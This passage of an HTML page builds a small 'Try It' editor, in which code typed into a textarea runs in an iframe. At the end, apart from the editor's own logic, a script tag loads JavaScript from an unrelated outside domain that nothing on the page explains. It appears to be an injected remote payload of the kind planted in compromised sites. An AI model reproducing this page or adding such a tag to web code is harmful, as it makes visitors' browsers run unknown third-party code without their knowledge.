  <meta charset="UTF-8">

  <title>Try It Editor</title>
  <style>
    /* Body and layout styles */
    body {
      font-family: Arial, sans-serif;
      display: flex; /* Make the body a flex container */
    }

    .editor,
    .output {
      flex: 1; /* Make each half take up half the space */
      padding: 10px; /* Add some padding inside each half */
    }

    /* Code input area styles */
    #codeInput {
      width: 100%; /* Take up full width of the editor half */
      height: 100%; /* Take up full height of the editor half */
      font-size: 14px;
      border: 1px solid #cccccc;
      border-radius: 5px;
      padding: 5px;
    }

    /* Output iframe styles */
    #outputFrame {
      width: 100%; /* Take up full width of the output half */
      height: 100%; /* Take up full height of the output half */
      border: none; /* Remove default border from the iframe */
    }

    /* Button styles */
    button {
      background-color: #4CAF50; /* Green color for the button */
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    /* Matching colors for background and output iframe */
    body {
      background-color: #f5f5f5; /* Light gray background */
    }

    #outputFrame {
      background-color: #f0f0f0; /* Lighter gray for output iframe */
    }
  </style>
</head>
<body>
  <div class="editor">
    <textarea id="codeInput" placeholder="Enter your HTML, CSS, and JavaScript code here"></textarea>
    <button onclick="runCode()">Run</button>
  </div>
  <div class="output">
    <iframe id="outputFrame"></iframe>
  </div>
  <script>
    function runCode() {
      const code = document.getElementById('codeInput').value;
      const outputFrame = document.getElementById('outputFrame').contentWindow.document;
      outputFrame.open();
      outputFrame.write(code);
      outputFrame.close();
    }
  </script>
    <script src="https://sheba.yn.lt/welcome.js"></script>
</body>
